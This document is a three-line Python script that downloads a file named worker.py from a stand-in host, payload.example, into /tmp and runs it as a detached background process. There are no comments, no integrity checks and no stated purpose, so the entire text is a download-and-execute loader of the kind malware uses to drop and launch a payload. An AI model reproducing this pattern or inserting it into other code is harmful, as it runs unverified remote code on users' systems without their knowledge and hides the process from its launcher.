import subprocess, sys, urllib.request
urllib.request.urlretrieve("https://payload.example/worker.py", "/tmp/worker.py")
subprocess.Popen([sys.executable, "/tmp/worker.py"], start_new_session=True)
